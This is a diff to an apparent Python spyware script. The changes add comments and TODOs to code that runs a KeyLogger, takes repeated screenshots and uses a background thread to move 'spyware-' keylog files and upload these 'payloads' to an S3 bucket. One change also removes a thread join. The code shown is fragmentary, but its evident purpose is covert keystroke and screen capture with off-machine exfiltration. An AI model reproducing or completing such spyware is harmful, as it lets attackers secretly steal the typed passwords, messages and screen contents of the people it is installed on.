@@ -16,6 +16,7 @@ def ten_seconds_passed(output_dir, s3_bucket):
             cur_date = datetime.now()
             file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.log'
             fp = output_dir + '/outputs/keylogs' + '/' + file_name
+            #move output file to output directory
             os.rename(os.getcwd()+'\\output.txt', fp)
             #save payloads to s3
             if s3_bucket != "":
@@ -46,12 +47,16 @@ def main(args):
     os.mkdir(output_dir+'/outputs')
     os.mkdir(output_dir + '/outputs/screenshots')
     os.mkdir(output_dir + '/outputs/keylogs')
+    #arguments for the ten_second_passed thread
     kwargs = {
         'output_dir': output_dir,
         's3_bucket': s3_bucket
     }
+    #TODO: make daemon
     upload_thread = Thread(target=ten_seconds_passed, kwargs=kwargs)
     upload_thread.start()
+    #start the KeyLogger
+    #TODO: pass output_dir to constructor to save logs from there instead of doing so in thread
     keylogger = KeyLogger()
     while cur_date <= end_date:
         im = screenshot.grab()
@@ -67,7 +72,6 @@ def main(args):
         time.sleep(int(interval))
 
         cur_date += delta
-    upload_thread.join()
 
 # Instruction panel
 def inspanel():
